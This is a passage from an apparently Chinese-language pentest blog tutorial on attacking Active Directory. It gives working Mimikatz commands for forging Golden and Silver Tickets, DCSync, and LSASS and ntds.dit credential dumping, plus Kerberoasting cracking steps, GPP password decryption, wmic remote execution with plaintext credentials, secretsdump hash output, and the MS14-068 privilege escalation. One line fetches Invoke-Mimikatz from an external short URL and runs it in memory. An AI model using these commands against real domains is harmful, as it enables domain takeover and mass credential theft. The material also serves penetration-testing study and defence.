<li>b. 其次,　黄金票据可以用来绕过当前Kerberos有关加密策略的要求。<br>  例如,可以使用DES或RC4加密算法创建一个TGT,即使该域明确支持AES,禁止使用DES或RC4。<br>  此情况会产生一个有趣的现象: TGT使用DES加密而服务票据使用AES加密。<br>  票据授予服务似乎并不担心TGT,也不拒绝异常行为,因为没有机制让票据授予服务报告关于策略的错误。</li>
<li>c. 再次,黄金票据并没启用任何高级账户策略的设置。微软添加了一个功能来验证服务票据的请求,以确保已禁用的TGT不能用于获得服务票据。<br>  然而,该功能的实现存在问题。只有当TGT的寿命超过20分钟时,票据授予服务才会验证TGT的有效性。<br>  如果TGT的寿命低于20分钟,票据授予服务将直接颁发服务票据,而不去验证TGT的有效性,默认情况下服务票据具有10小时的有效期。<br>  因为攻击者可以利用Mimikatz工具随心所欲的产生票据,所以攻击者只需清除旧的TGT,再替换为寿命少于20分钟的新票据,轻松突破20分钟的限制条件。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>d. 最终,黄金票据可以被配置成任意用户和任意组的成员。这也可以创建一个票据,票据中任何用户都可以是任意组的成员。<br>  这可以用来绕过文件服务器或其他应用程序上基于用户组的访问限制。黄金票据中的用户和SID不必在活动目录中真实存在。<br>  也就意味着可以为域中不存在的用户创建TGT,并仍然可以在TGT生命周期内前20分钟内从票据授予服务获得服务票据。</li>
<li>所需条件: <blockquote>
<ul>
<li>krbtgt账户的NT-Hash - 该散列值仅位于域控服务器的活动目录中。所以攻击者必须攻陷域控服务器并提权至管理员权限</li>
<li>域账户名称 - 通常是域管理员”domain admin”</li>
<li>域名</li>
<li>域SID - 可以从域用户的SID或通过sysinternal中psGetsid.exe获得</li>
</ul>
</blockquote>
</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>简单过程:</li>
<li>清空缓存证书<br>  kerberos::purge  ( or klist purge)</li>
<li>手动创建了一张域管理的黄金票据<br>  kerberos::golden /admin:administrator /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /krbtgt:3f65c6984cbfebdc5f17986d07620afb /ticket:administrator.kirbi.bin</li>
<li>使用这张票据<br>  kerberos::ptt administrator.kirbi.bin<br>  <img src="/2018/01/19/域滲透相关/域渗透相关/Golden_Ticket1.png" alt="Golden_Ticket1"></li>
<li>然后我的低权限本地用户，就被提升到域管理权限<br>  kerberos::list</li>
<li>利用dcsync功能获取hash,通过DRSR(目录复制服务DRS远程协议)协议，从域控制器获取任何用户的hash<br>  lsadump::dcsync /domain:demo.local /user:testwin10  (administrator / testwin7)<br>  <img src="/2018/01/19/域滲透相关/域渗透相关/Golden_Ticket2.png" alt="Golden_Ticket2"></li>
</ul>
</blockquote>
<h2 id="5-Silver-Ticket-白银票据"><a href="#5-Silver-Ticket-白银票据" class="headerlink" title="5. Silver Ticket (白银票据)"></a>5. Silver Ticket (白银票据)</h2><blockquote>
<p>简义 : 发生在上面的过程5，可以伪造TGS(前提是获取服务账号的口令散列值)，宣称自己是域内任何账号，例如域管。<br>    Silver Ticket生成时指定了相关的服务名，因此只能用来访问相应的服务，所以局限性比较大，没有golden ticket好用</p>
</blockquote>
<p>所需条件(mimikatz生成silver ticket): </p>
<blockquote>
<ul>
<li>/domain</li>
<li>/sid            ( S-1-5-21-1239069908-882060383-2558203358-500 注意:不要後面的-500  )</li>
<li>/target:域控全称</li>
<li>/service:目标服务器上面的kerberos服务，此处为cifs</li>
<li>/rc4:域控的计算机账户ntlm hash</li>
<li>/user:要伪造的用户名(可以不存在也可是存在的)</li>
</ul>
</blockquote>
<p>mimikatz.exe “kerberos::golden /domain:域 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:silver /ptt”即可生成并导入Silver Ticket<br>常用的服务名有以下:</p>
<pre><code>服务名称                    同时需要的服务
WMI                        HOST、RPCSS
PowerShell Remoting        HOST、HTTP
WinRM                    HOST、HTTP
Scheduled Tasks            HOST
Windows File Share        CIFS
LDAP                    LDAP
Windows Remote Server    RPCSS、LDAP、CIFS
</code></pre><p>==&gt;</p>
<blockquote>
<p>kerberos::golden /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /target:owa2010dc.demo.local /service:cifs /rc4:aac6185241728f7685c8d50c61573b75 /user:silver /ptt<br>    (/rc4:aac6185241728f7685c8d50c61573b75 這裏我用的是owa2010dc$机器賬戶的NTLM hash<br>    <img src="/2018/01/19/域滲透相关/域渗透相关/Silver_Ticket1.png" alt="Silver_Ticket1"></p>
</blockquote>
<h2 id="0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><a href="#0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破" class="headerlink" title="0x06. Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)"></a>0x06. Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</h2><blockquote>
<p>简义 : 发生在上面的过程3,4, 目标的服务账户的服务器主体名称(SPN)请求一个Kerberos服务票据 (TGS) 。<br>    这里会采用一个有效的用户认证票据(TGT)来请求一个或几个运行在服务器上的目标服务票据。<br>    域控不会检测用户是否真正连接到了这些资源上(即使用户可能真的有权限访问)。<br>    域控会在活动目录中查找SPN并且用SPN关联的用户账户把票据进行加密，以此赋予用户访问服务的权限。<br>    请求的Kerbero服务票据的加密类型是 RC4_HMAC_MD5, 这意味着服务账户的NTLM密码哈希会被用来加密服务票据。<br>    所以Kerberoast能够通过尝试不同的NTLM哈希来解开kerberos票据，一旦票据被成功解开，它的密码也就到手了。<br>    (获得服务票据不需要提权，同时也不会发送数据到目标机器。)<br>    <a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a><br>        python tgsrepcrack.py wordlist.txt sql.kirbi</p>
</blockquote>
<h2 id="0x07-Kerberoasting-Kerberoast攻击的另一种姿势"><a href="#0x07-Kerberoasting-Kerberoast攻击的另一种姿势" class="headerlink" title="0x07. Kerberoasting - Kerberoast攻击的另一种姿势"></a>0x07. Kerberoasting - Kerberoast攻击的另一种姿势</h2><blockquote>
<p>我们通常不关心基于主机的SPN，因为计算机的机器帐户密码默认是随机的，每30天更换一次。<br>    但是，请记住，也可以为域用户帐户注册任意的SPN。<br>    一个常见的例子就是一个服务账户管理着多个MSSQL实例;此用户帐户注册的每个MSSQL实例都有一个&lt;MSSQLSvc/HOST:PORT&gt; 这样的SPN，<br>    这个SPN存储在用户的serviceprincipalname属性里.如果我们有一个为域用户帐户注册的任意SPN，<br>    那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证<br>    注意的是： 任何具有服务主体名称SPN的域用户帐户都可以被该域中任何用户请求该SPN的TGS，<br>    从而允许攻击者离线破解服务帐户的明文密码！这显然取决于一个可破解的服务帐户明文密码的复杂度</p>
</blockquote>
<blockquote>
<p>“老套的”Kerberoasting攻击姿势<br>    Tim给出的利用方法或工具包是使用工具集的组合来请求票证，并从内存中提取(使用Mimikatz)票证，然后将它们转换为可破解的格式。一般来说，整个过程如下：</p>
<ul>
<li>a. 使用Tim的GetUserSPNS.ps1脚本或者Sean的Find-PSServiceAccounts.ps1脚本或PowerView的”Get-NetUser -SPN”来枚举域帐户的SPN。<br>  枚举域帐户的SPN :  <pre><code>  GetUserSPNS.ps1 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
  PS C:\Users\Administrator\Desktop\kerberoast&gt; . .\GetUserSPNs.ps1
      ServicePrincipalName : kadmin/changepw
      Name                 : krbtgt
      SAMAccountName       : krbtgt
      MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local
      PasswordLastSet      : 9/13/2016 11:37:59 AM
</code></pre></li>
</ul>
</blockquote>
<pre><code>        ServicePrincipalName : test/test
        Name                 : testwin10
        SAMAccountName       : testwin10
        MemberOf             :
        PasswordLastSet      : 1/12/2018 3:00:22 PM
    PowerView 的 Get-NetUser -SPN - https://github.com/PowerShellMafia/PowerSploit/blob/5690b09027b53a5932e42399f6943e03fa32e549/Recon/PowerView.ps1#L2087-L2089
    PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-NetUser -spn
        objectsid              : S-1-5-21-1239069908-882060383-2558203358-502
        iscriticalsystemobject : True
        samaccounttype         : 805306368
        objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local
        objectclass            : {top, person, organizationalPerson, user}
        logoncount             : 0
        lastlogon              : 1/1/1601 8:00:00 AM
        serviceprincipalname   : kadmin/changepw
        adspath                : LDAP://CN=krbtgt,CN=Users,DC=demo,DC=local
        dscorepropagationdata  : {1/12/2018 6:32:42 AM, 9/13/2016 4:06:37 AM, 9/13/2016 3:53:08 AM, 1/1/1601 12:00:00 AM}
        distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=local
        ....
    ![getspn](域渗透相关/getspn.png)
</code></pre><blockquote>
<ul>
<li>b. 请求这些特定的SPN的 TGS可以使用Windows内置的工具setspn.exe或者在PowerShell中调用.NET的<pre><code>  System.IdentityModel.Tokens.KerberosRequestorSecurityToken类。
</code></pre></li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>c. 使用Mimikatz的kerberos::list/export命令从内存中提取这些票证，并设置可选的base64导出格式。<pre><code>  然后下载票据，或者将base64编码的票证拖到攻击者的机器上进行解码。
</code></pre></li>
<li>d. 使用Tim的tgsrepcrack.py开始离线破解密码:<pre><code>      https://raw.githubusercontent.com/nidem/kerberoast/master/tgsrepcrack.py
      pip install requests-kerberos,kerberos-sspi
      import kerberos 改成 import kerberos_sspi as kerberos
      python tgsrepcrack.py dic.txt file.kirbi
 或者使用John the Ripper的kirbi2john.py从原始票证中提取可破解的哈希格式：
      python kirbi2john.py *.kirbi &gt; johnkirb.txt
      john johnkirb.txt --wordlist=dic.txt  
</code></pre></li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>e. xan7r给 Tim的工具集增加了一个分支，他添加了一个autokerberoast.ps1脚本，自动化了上述攻击过程:<br>  <a href="https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1</a><pre><code>  此外，@ tifkin_写了一个Go语言版本的TGS爆破器，比原来的Python版本要快一些。
</code></pre></li>
</ul>
</blockquote>
<h2 id="0x08-SYSVOL"><a href="#0x08-SYSVOL" class="headerlink" title="0x08. SYSVOL"></a>0x08. SYSVOL</h2><blockquote>
<p>在域环境中修改域机器的本地账户密码是个很麻烦的事情，<br>    但是微软的GPP(组策略偏好)中提供了一个批量修改本地账户的功能，<br>    可以一次性批量的修改本地账户密码(组策略不仅仅可以用来批量管理密码)。<br>    但是最初却导致了一个问题，就是域管理员在配置GPP的时候，会在SYSVOL这个文件夹中保存当前GPP配置的xml文件，<br>    如果管理员在配置的时候填入了密码，其中就包含了加密了的用户密码(SYSVOL是一个存储域公共文件服务器副本的共享文件夹，<br>    所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。)<br>    一般sysvol文件的位置是 :</p>
<ul>
<li>\<domain>\SYSVOL\<domain>\Policies\<br>其中的groups.xml(Services.xml、ScheduledTasks.xml、Printers.xml、Drives.xml、DataSources.xml)就可能保存了加密后的本地管理账户密码<br>  (ps:这些文件中并不一定存在密码，因为只有当管理员在配置的时候，在界面的密码框中输入密码之后才会保存(設置計劃任務))<br>  我们可以通过这个powershell的脚本进行解密Get-GPPPassword.ps1<br>  (<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a>)<br>  . .\Get-GPPPassword.ps1<br>  Get-GPPPassword<br>  同样，我们也可以使用Get-GPPPassword.ps1这个脚本在域内自动搜索所有的sysvol中保存的密码并自动解密<br>  若获取不到:</domain></domain></li>
<li>使用了LAPS批量管理域内主机本地管理员帐户 (使用ldapsearch来dump域中的LAPS密码 <a href="https://www.anquanke.com/post/id/86502" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86502</a>)<br>  即 Local Administrator Password Solution : LAPS最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。</li>
<li>域控安装补丁KB2962486<br>  这个补丁禁止在组策略配置中填入密码</li>
<li>目标不在组策略中使用域控密码</li>
<li>设置了共享文件夹\SYSVOL的访问权限</li>
</ul>
</blockquote>
<h2 id="0x09-ntds-dit-活动目录的数据库文件"><a href="#0x09-ntds-dit-活动目录的数据库文件" class="headerlink" title="0x09. ntds.dit (活动目录的数据库文件)"></a>0x09. ntds.dit (活动目录的数据库文件)</h2><blockquote>
<p>包含有关活动目录域中所有对象的所有信息 及 所有域用户和计算机帐户的密码哈希值。<br>    域控制器(DC)上的ntds.dit文件只能由可以登录到DC的用户访问 。<br>    这些组可以默认登录到域控制器:<br>        Enterprise Admins (目录林管理员组)<br>        Domain Admins(域管理员组)<br>        Administrators(管理员组)<br>        Backup Operators(备份操作成员)<br>        Account Operators(账户管理组)<br>        Print Operators(打印机操作组)<br>        不能登录到域控制器可能 : </p>
<ul>
<li>a. 限制了有权登录到域控制器的组/帐户。</li>
<li>b. 限制了具有完整活动目录权限的组/帐户，特别是服务帐户。</li>
</ul>
</blockquote>
<blockquote>
<p>若帐户登录了域控制器，首先把所有的登录凭证全部获取到本地:</p>
<ul>
<li><ol>
<li>MIMIKATZ从域控上面抓取到所有账户信息:<pre><code>   mimikatz # lsadump::lsa /inject exit
   or 保存到mimikatz.log:
   mimikatz # log
   mimikatz # privilege::debug
   mimikatz # lsadump::lsa /inject
   ![mimikatz-lsa](域渗透相关/mimikatz-lsa.png)
</code></pre></li>
</ol>
</li>
<li><ol>
<li>使用MIMIKATZ转储LSASS内存(获取域管理员凭据)<pre><code>   mimikatz # sekurlsa::minidump c:\temp\lsass.dmp
   mimikatz # sekurlsa::logonpasswords
</code></pre></li>
</ol>
</li>
<li><ol>
<li>使用任务管理器转储LSASS内存(获取域管理员凭据)<pre><code>   一旦LSASS被转储，mimikatz就可以对lsass.dmp进行提取
   右鍵lsass.exe : Create Dump File
</code></pre></li>
</ol>
</li>
<li><ol>
<li>用NTDSUTIL创建媒体安装集(IFM) (用于抓取NTDS.DIT文件)<br>NTDSUtil一个本地运行的针对活动目录数据库(ntds.dit)的命令，并且允许为DCPromo准备IFM集。<br>IFM是用于DCPromo命令中”从媒体安装”这一过程的，所以，在配置域控时就不需要通过网络从其他域控拷贝数据。<br>并且也会在c:/temp目录下生成的一份NTDS.dit附件。<br>   ntdsutil “ac i ntds” “ifm” “create full c:\windows\temp\temp” q q<br>創建了temp目錄，下面会生成 ntds.dit 和 SYSTEM / SECURITY</li>
</ol>
</li>
<li><ol>
<li>从NTDS.DIT文件(和注册表系统配置单元)转储活动目录域凭据<br>需要 ntds.dit 和 system.hive (由第4步得到)<br><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py</a> (only linux):<br>   -&gt; python secretsdump.py -ntds /root/Desktop/temp/Active Directory/ntds.dit -system /root/Desktop/temp/registry/SYSTEM LOCAL<pre><code>-&gt; 
   demo.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
   Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   OWA2010DC$:1000:aad3b435b51404eeaad3b435b51404ee:aac6185241728f7685c8d50c61573b75:::
   krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3f65c6984cbfebdc5f17986d07620afb:::
   OWA2010$:1103:aad3b435b51404eeaad3b435b51404ee:d51220f5659cd982fb3fbe4169093181:::
</code></pre>or -&gt; <a href="https://github.com/zcgonvh/NTDSDumpEx/releases" target="_blank" rel="noopener">https://github.com/zcgonvh/NTDSDumpEx/releases</a><br>   NTDSDumpEx.exe -d ntds.dit -o hash.txt -s system.hiv </li>
</ol>
</li>
</ul>
</blockquote>
<pre><code>进一步从NTDS.DIT获取详细的信息:
https://github.com/libyal/libesedb/releases
$ ./configure
$ make
$ sudo make install
$ sudo ldconfig
root@kali2:~/Desktop/temp# /usr/local/bin/esedbexport -m tables &quot;/root/Desktop/temp/Active Directory/ntds.dit&quot;  
    (ntds.dit中提取出表，20分鐘，两个重要的表为:datatable以及link_table，他们都会被存放在./ntds.dit.export/文件夹中.)
使用ntdsxtract提取域中信息，一旦表被提取出来，很多python工具可以将这些表中的信息进一步提取，比如ntdsxtract就可以完美进行。
https://github.com/csababarta/ntdsxtract.git
root@kali2:~/Desktop/ntdsxtract-master# python dsusers.py /root/Desktop/temp/ntds.dit.export/datatable.3 /root/Desktop/temp/ntds.dit.export/link_table.5 output --syshive /root/Desktop/temp/registry/SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt
root@kali2:~/Desktop/ntdsxtract-master# python dscomputers.py /root/Desktop/temp/ntds.dit.export/datatable.3 computer_output --csvoutfile all_computers.csv
![mimikatz-lsa](域渗透相关/libesedb__ntdsxtract__ntds.dit.png)
</code></pre><blockquote>
<ul>
<li><ol>
<li>可创建和使用GOLDEN TICKET</li>
</ol>
</li>
<li><ol>
<li>卷影复制(VSS)<br>ntds.dit我们是没法直接进行复制拷贝的，会提示文件已被占用，这个时候我们可以通过windows提供的卷影复制功能来复制被进程占用的文件(xp和server 2003以上都存在此功能)<br>1.wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create “cmd /c vssadmin create shadow /for=c: 2&gt;&amp;1 &gt; c:vss.log”<br>2.wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create “cmd /c copy 卷影ID/Windows/NTDS/NTDS.dit C:/windows/temp/NTDS.dit 2&gt;&amp;1”</li>
</ol>
</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><ol>
<li>其他 - 转储活动目录数据库(ntds.dit)凭证的方法总结<br>   How Attackers Dump Active Directory Database Credentials<pre><code>   https://adsecurity.org/?p=2398
</code></pre>   [译]转储活动目录数据库凭证的方法总结 <pre><code>   http://drops.xmd5.com/static/drops/pentesting-12020.html
   之前发表过两篇关于如何转储 AD 数据库凭证的文章： 
       a. 攻击者如何从一个域控制器中读取活动目录数据库(NTDS.DIT)(https://adsecurity.org/?p=451)
       b. 在 Active Directory 域中获得管理员权限的攻击方法(https://adsecurity.org/?p=2362  [译]https://xianzhi.aliyun.com/forum/topic/115)
</code></pre>   这里所介绍的方法需要权限提升，因为它们需要连接到域控制器转储凭据。如下：<pre><code>   a. 使用 NTDSUtil 创建 IFM 抓取 DC 本地的 Ntds.dit 文件(VSS 卷影复制)
   b. 使用 VSS 卷影复制远程读取 Ntds.dit。
   c. 使用 PowerSploit 的 Invoke-NinjaCopy 远程读取 Ntds.dit(需要目标 DC 启用 PowerShell 远程管理)。
   d. 在 DC 中使用 Mimikatz 转储 Active Directory 凭据。
   e. 在 DC 中使用 Invoke-Mimikatz 转储 Active Directory 凭据。
   f. 使用 Invoke-Mimikatz 远程转储 Active Directory 凭据。
   g. 使用 Mimikatz 的 DCSync 功能远程转储 Active Directory 凭据。
   注意：如果已经发现了 Active Directory 数据库(NTDS.DIT)的副本，那么攻击者无需提升权限即可从中转储凭据。
</code></pre></li>
</ol>
</li>
</ul>
</blockquote>
<pre><code>    &gt;&gt; * 0x01 远程执行命令方式
        有几种不同的方式可以在域控制器上远程执行命令，假设它们已经有了相应的执行权限。最可靠的远程执行方法包括两种 PowerShell(利用 WinRM )和 WMI。
        WMI
        Wmic /node:COMPUTER/user:DOMAIN\USER /password:PASSWORD process call create &quot;COMMAND&quot;

        PowerShell (WMI)
        Invoke-WMIMethod -Class Win32_Process -Name Create –ArgumentList $COMMAND –ComputerName $COMPUTER -Credential $CRED

        WinRM
        winrs –r:COMPUTER COMMAND

        远程 PowerShell
        Invoke-Command –computername $COMPUTER -command { $COMMAND}
        New-PSSession -Name PSCOMPUTER –ComputerName $COMPUTER; Enter-PSSession -Name PSCOMPUTER

    &gt;&gt; * 0x01 使用 NTDSUtil 创建 IFM 抓取 DC 本地的Ntds.dit文件 (VSS 卷影复制)
        NTDSUtil一个本地运行的针对活动目录数据库(ntds.dit)的命令，并且允许为DCPromo准备IFM集。
        IFM是用于DCPromo命令中&quot;从媒体安装&quot;这一过程的，所以，在配置域控时就不需要通过网络从其他域控拷贝数据。
        IFM集，并且也会在c:/temp目录下生成的一份NTDS.dit附件。
        ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\windows\temp\temp&quot; q q
        創建了temp目錄，下面会生成 ntds.dit 和 SYSTEM / SECURITY
        这个命令也可以通过 WMI 或 PowerShell 远程执行。

    &gt;&gt; * 0x02 使用 VSS 卷影副本远程读取 ntds.dit(通过 WMI or PowerShell 远程管理)
        ntds.dit我们是没法直接进行复制拷贝的，会提示文件已被占用，这个时候我们可以通过windows提供的卷影复制功能来复制被进程占用的文件(xp和server 2003以上都存在此功能)
            a. wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c vssadmin create shadow /for=c: 2&gt;&amp;1 &gt; c:\vss.log&quot;
        当 VSS 快照完成后，我们就可以从 VSS 中将 NTDS.dit 文件和 注册表中的 System hive 复制到域控制器的 C 盘中。
            b1. wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c copy 卷影ID\Windows\NTDS\NTDS.dit C:\windows\temp\NTDS.dit 2&gt;&amp;1 &gt; c:\vss2.log&quot;
            b2. wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c copy 卷影ID\Windows\System32\config\SYSTEM C:\windows\temp\SYSTEM.hive 2&gt;&amp;1 &gt; c:\vss2.log&quot;
        之后就可以将域控制器中 c:\\temp 目录的文件复制到本地的计算机中。
            copy /z \\demo.local\c$\windows\temp\NTDS.dit c:\temp
            copy /z \\demo.local\c$\windows\temp\SYSTEM.hive c:\temp
        较新版本的 Windows 中 WMIC 已经有些过时了。 PowerShell 提供了 Invoke-WMIMethod cmdlet 可以执行相同的功能。

    &gt;&gt; * 0x03 使用 PowerSploit 的 Invoke-NinjaCopy 远程读取 ntds.dit(需要目标 DC 启用 PowerShell 远程管理)
        Joe Bialek (@JosephBialek)在他的博客中写了如下关于 Invoke-NinjaCopy 的信息。
            目前，已有好几种方法可以转储 Active Directory 和本地密码的 HASH。
            不过直到最近，我发现目前获取 HASH 的技术，需 要依赖于注入代码到 LSASS 进程或使用 VSS ，以获得含有 HASH 文件的副本。
            我创建了一个名为 Invoke-NinjaCopy 的 PowerShell 脚本，支持任何文件(包括NTDS.DIT)的复制，
            无需启动可疑的服务，无需注入代码到进程中，或者提升到 SYSTEM 权限。
        该脚本可以打开整个卷(如C:)的读取句柄并解析 NTFS 结构，从而从一个 NTFS 卷复制文件。此操作需要目标服务器的管理员权限。利用此脚本可以绕过以下保护措施：
            一个已被进程打开且不能被其他进程操作的文件，如 Ntds.dit 文件或注册表中的 SYSTEM hive 配置文件。
            已被设置 SACL 标志的文件，在打开此类文件时，会有提醒(此脚本没有使用 Win32 API 打开文件，因此Windows 没有反应)。
            绕过 DACL ，例如 DACL 只允许 SYSTEM 权限打开一个文件。
            如果指定了 LocalDestination 参数，则文件将被复制到本地服务器(脚本正在从运行的服务器)中指定的文件路径。
            如果指定了 RemoteDestination 参数，则该文件将被复制到远程服务器中指定的文件路径。
                Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -ComputerName &quot;RDLABDC02&quot; -LocalDestination &quot;c:\temp\ntds.dit&quot;
            使用 DIT 快照查看器(https://github.com/yosqueoy/ditsnap) ，可以验证我们是否顺利拿到了Ntds.dit 文件。

    &gt;&gt; * 0x04 在 DC 中使用 Mimikatz 转储 Active Directory 凭据
        一般情况下服务帐户就是域管理员组或同等权限的成员或者攻击者从域管理员最近登录到的计算机中 dump 出登录凭证。
        使用这些凭据，攻击者可以访问域控制器，并可以得到所有的域凭据，其中包括用于创建 Kerberos 的黄金票证的 KRBTGT 帐户的 NTLM 哈希值。
        1. mimikatz.exe从域控上面抓取到所有账户信息:
            mimikatz lsadump::lsa /inject exit
            保存到mimikatz.log:
                # log
                # privilege::debug
                # lsadump::lsa /inject
            在域控制器上运行时，Active Directory域中转储凭证数据。需要管理员访问调试或本地SYSTEM权限
            注意：RID 502的帐户是KRBTGT帐户，RID 500的帐户是该域的默认管理员。

        2. Invoke-Mimikatz本地转储Active Directory凭据
            使用 mimikatz 从 LSASS 进程转储凭证 ： Invoke-Mimikatz -DumpCreds
            使用 mimikatz 导出所有私有证书即使它们已被标记为不可导出 ： Invoke-Mimikatz –DumpCerts
            在远程计算机上使用 debug 提升权限：Invoke-Mimikatz -Command &quot;privilege::debug exit&quot; -ComputerName &quot;computer1&quot;
            or Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;LSADump::LSA /inject&quot; exit&#39;

        3. 使用 Invoke-Mimikatz 远程转储 Active Directory 凭据 (通过 PowerShell 远程管理)  
            从外网下载并完全是在内存中执行代码
            IEX(New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;LSADump:LSA /inject&quot;&#39; -Computer dc2010.demo.local

    &gt;&gt; * 0x05 使用 Mimikatz 的 DCSync 功能远程转储 Active Directory 凭据
        新的特性—— “DCSync”，可以有效地“假冒”一个域控制器，并可以向目标域控制器请求帐户密码数据。
        之前利用 DCSync 的攻击方法是在域控制器上运行 Mimikatz 或 Invoke-Mimikatz 得到 KRBTGT 账户的密码哈希创建黄金票证。
        如果使用适当的权限执行 Mimikatz 的 DCSync 功能，攻击者就可以通过网络远程读取域控制器的密码哈希，以及以前的密码的哈希，
        且无需交互式登录或复制 Active Directory 的数据库文件NTDS.DIT。

        运行 DCSync 所要求的特殊权限有管理员组Administrators，域管理员组 Domain Admins或企业管理员组Enterprise Admins
        以及域控制器计算机帐户的任何成员都能够运行 DCSync 去读取密码数据。
        需要注意的是只读域控制器默认是不允许读取用户密码数据的。

        DCSync 是何如工作的：
            a. 使用指定的域名称发现域控制器。
            b. 请求域控制器通过 DSGetNCChanges 复制用户凭据利用目录复制服务DRS远程协议
            DCSync 选项：
                /user - 要拉取数据的用户的 id 或 SID
                /domain可选的 Active Directory 域的 FQDN 域名，Mimikatz 会发现域中的一个 DC 并去连接。如果不提供该参数，Mimikatz 会默认设置为当前域。
                /dc可选的指定你想要使用 DCSync 连接并收集数据的域控制器。
                另外还有一个/guid参数。
                DCSync 命令行示例：
                取 demo.local域中的 krbtgt / testwin7 / administrator 用户帐户的密码数据：
                Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:demo.local /user:testwin7&quot; exit
</code></pre><h2 id="0x10-MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控"><a href="#0x10-MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控" class="headerlink" title="0x10.MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)"></a>0x10.MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)</h2><blockquote>
<p>允许域内任何一个普通用户，将自己提升至域管权限。<br>    作为普通用户向域控请求一个没有PAC的Kerberos TGT认证的票据，域控会返回一个TGT(不包含PAC，PAC通常包含有用户组中的成员关系)<br>    生成一个伪造的PAC，因为没有密钥，所以生成的PAC”被标记”有MD5算法，而不是带有域用户密码数据的HMAC_MD5类型。<br>    把伪造的PAC结合上TGT构造认证数据，作为TGS服务的一部分发送到域控。<br>    域控会混淆构造的数据，所以直接丢弃之前用户发送没带有PAC的TGT，然后新构造一个TGT并用自己的认证数据插入到伪造的PAC当中，再把新TGT发送给用户</p>
</blockquote>
<p>这样带有伪造PAC的TGT就能使用户成为有漏洞域控上的域管理员。</p>
<blockquote>
<ul>
<li><ol>
<li>mimikatz从域控上面抓取到所有账户信息<br>   mimikatz # log<br>   Using ‘mimikatz.log’ for logfile : OK<br>   mimikatz # privilege::debug<br>   Privilege ‘20’ OK<br>   mimikatz # lsadump::lsa /inject<br>   ……</li>
</ol>
</li>
<li><ol>
<li><a href="https://github.com/bidord/pykek" target="_blank" rel="noopener">https://github.com/bidord/pykek</a><br>   C:\pykek-master&gt;python ms14-068.py -u <a href="mailto:testwin7@demo.local" target="_blank" rel="noopener">testwin7@demo.local</a> -s S-1-5-21-1239069908-882060383-2558203358-1130 -d owa2010dc.demo.local  -p 1qaz$RFV –rc4 6df9f68e4b0656fa9ffd91d250506f8f<br>   [+] Creating ccache file <a href="mailto:&#39;TGT_testwin7@demo.local.ccache" target="_blank" rel="noopener">&#39;TGT_testwin7@demo.local.ccache</a>‘… Done!]</li>
</ol>
</li>
<li><ol>
<li>mimikatz # kerberos::ptc <a href="mailto:TGT_testwin7@demo.local.ccache" target="_blank" rel="noopener">TGT_testwin7@demo.local.ccache</a> (利用mimikatz注入高权限TGT的缓存证书)</li>
</ol>
</li>
</ul>
</blockquote>
<p>列举缓存证书的命令klist</p>
<p>或者使用 kekeo</p>
<blockquote>
